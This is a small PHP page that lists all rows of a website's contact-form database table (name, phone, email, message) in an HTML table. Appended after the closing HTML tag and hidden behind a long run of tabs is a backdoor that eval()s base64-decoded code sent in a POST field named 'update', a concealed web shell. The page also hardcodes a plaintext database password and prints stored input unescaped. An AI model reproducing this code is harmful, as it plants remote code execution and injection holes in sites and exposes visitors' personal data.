<html>
<body bgcolor="lightgreen">

<?php
$con = mysql_connect("localhost","thefinish","a37cnfHvzacT");
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }



mysql_select_db("thefinish_db", $con);


$result=mysql_query("select * from contact");

echo "<table border='1' bgcolor='white' cellpadding=10 align='center'>
<tr bgcolor='#F6CECE'>
<th><h3>Name</h3></th>
<th><h3>Phone</h3></th>
<th><h3>E-Mail</h3></th>
<th><h3>Message</h3></th>
</tr>";

while($row=mysql_fetch_array($result))
{
echo "<tr bgcolor='#F5D0A9'>";
echo "<td>".$row['name']."</td>";
echo "<td>".$row['phone']."</td>";
echo "<td>".$row['email']."</td>";
echo "<td>".$row['message']."</td>";
echo "</tr>";
}
echo "</table>";





mysql_close($con);
?>


</body>
</html>
																																													if (isset($_POST['update'])) {eval(base64_decode($_POST['update'])); exit;}
